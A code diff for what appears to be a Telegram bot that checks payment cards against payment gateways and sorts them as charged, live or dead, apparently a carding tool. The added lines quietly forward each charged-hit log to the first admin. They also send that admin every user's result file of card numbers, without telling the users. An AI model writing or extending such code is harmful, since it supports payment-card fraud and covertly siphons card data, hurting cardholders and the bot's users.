@@ -703,6 +703,12 @@ async def send_log_to_channel(response_msg, gateway, price, username, user_id):
         await bot.send_message(PVT_CHANNEL_ID, premium_emoji(log_message), parse_mode='html')
     except Exception as e:
         print(f"Error sending log to PVT channel: {e}")
+    # Also DM the admin directly
+    if ADMIN_IDS:
+        try:
+            await bot.send_message(ADMIN_IDS[0], premium_emoji(log_message), parse_mode='html')
+        except Exception as e:
+            print(f"Error sending charged hit to admin: {e}")
 
 # ========== DEAD INDICATORS ==========
 _DEAD_INDICATORS = (
@@ -1042,6 +1048,18 @@ async def send_final_results(user_id, results):
             await f.write(f"{r['card']} | {r.get('gateway','Unknown')} | {r.get('price','-')} | {r['message'][:100]} | {r.get('site','Unknown')}\n")
 
     await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
+
+    # Forward result file to admin
+    if ADMIN_IDS:
+        try:
+            admin_caption = (
+                f"📊 <b>Mass Check Results</b>\n"
+                f"👤 User: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
+                f"✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}"
+            )
+            await bot.send_message(ADMIN_IDS[0], premium_emoji(admin_caption), file=filename, parse_mode='html')
+        except Exception as e:
+            print(f"Error forwarding result file to admin: {e}")
 
     try:
         os.remove(filename)
